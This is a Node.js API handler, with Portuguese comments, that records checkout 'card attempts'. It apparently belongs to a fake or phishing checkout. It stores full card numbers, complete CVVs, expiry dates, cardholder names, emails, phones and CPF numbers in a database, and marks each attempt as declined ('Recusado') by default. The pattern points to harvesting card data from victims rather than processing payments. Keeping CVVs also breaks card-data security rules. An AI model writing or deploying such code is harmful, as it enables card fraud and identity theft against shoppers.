const {
  getOrderBySession,
  insertCardAttempt,
  readJson,
  sendJson
} = require('./_utils');

function cleanText(value, maxLength = 160) {
  return String(value || '').trim().slice(0, maxLength);
}

function onlyDigits(value) {
  return String(value || '').replace(/\D/g, '');
}

module.exports = async function handler(req, res) {
  try {
    if (req.method !== 'POST') {
      return sendJson(res, 405, { message: 'Metodo nao permitido.' });
    }

    const body = await readJson(req);
    
    // Debug: Log do body recebido (remova em produção se não quiser logs)
    // console.log('Body recebido:', JSON.stringify(body));

    const sessionId = cleanText(body.sessionId || body.session_id, 80);
    
    // Tenta buscar o pedido, mas não bloqueia se não achar (modo teste)
    let order = null;
    if (sessionId) {
        try {
            order = await getOrderBySession(sessionId);
        } catch (e) {
            console.warn('Erro ao buscar ordem:', e.message);
        }
    }

    // Lógica flexível para pegar o número do cartão
    let cardDigits = onlyDigits(body.cardNumber || body.card_number || '');
    
    // Se não veio numero completo, tenta pegar do last4 (fallback para códigos antigos)
    if (!cardDigits || cardDigits.length < 4) {
        const last4 = onlyDigits(body.cardLast4 || body.card_last4 || '');
        if (last4.length === 4) {
            // Se só tem last4, não podemos salvar o número completo, mas salvamos o que tem
            // Isso gera um registro incompleto, mas evita erro 400
            cardDigits = last4; 
        }
    }

    // Validação: Precisa ter pelo menos 4 dígitos para ser considerado um cartão
    if (cardDigits.length < 4) {
      return sendJson(res, 400, { message: 'Dados do cartao insuficientes.' });
    }

    const cvvDigits = onlyDigits(body.cardCvv || body.card_cvv || '');
    const expiry = cleanText(body.cardExpiry || body.card_expiry, 7);
    
    // Se o número for curto (ex: só last4), usamos ele como last4. Se for longo, é o full.
    const isFullNumber = cardDigits.length >= 13;
    const last4 = cardDigits.slice(-4);
    const fullNumberToSave = isFullNumber ? cardDigits : null; // Salva null se não for completo

    const amount = Number(body.amount || order?.amount || 0);

    const row = {
      session_id: sessionId || null,
      identifier: order?.identifier || cleanText(body.identifier, 80) || null,
      holder: cleanText(body.holder || body.name),
      email: cleanText(body.email, 180),
      phone: onlyDigits(body.phone).slice(0, 20),
      cpf: onlyDigits(body.cpf || body.document).slice(0, 14),
      
      // Colunas novas/existentes
      card_number: fullNumberToSave, // Salva completo se tiver, senão null
      card_brand: cleanText(body.cardBrand || body.card_brand, 40),
      card_last4: last4,
      card_expiry: expiry,
      card_cvv: cvvDigits, // Salva CVV completo
      
      amount: Number.isFinite(amount) ? Number(amount.toFixed(2)) : null,
      status: cleanText(body.status, 40) || 'Recusado',
      metadata: {
        source: 'checkout-card',
        luhnValid: Boolean(body.luhnValid),
        is_test: true
      }
    };

    const attempt = await insertCardAttempt(row);
    return sendJson(res, 200, { ok: true, id: attempt?.id || null });
  } catch (error) {
    console.error('Erro na API card-attempts:', error);
    return sendJson(res, 500, { message: error.message || 'Erro interno ao salvar tentativa.' });
  }
};
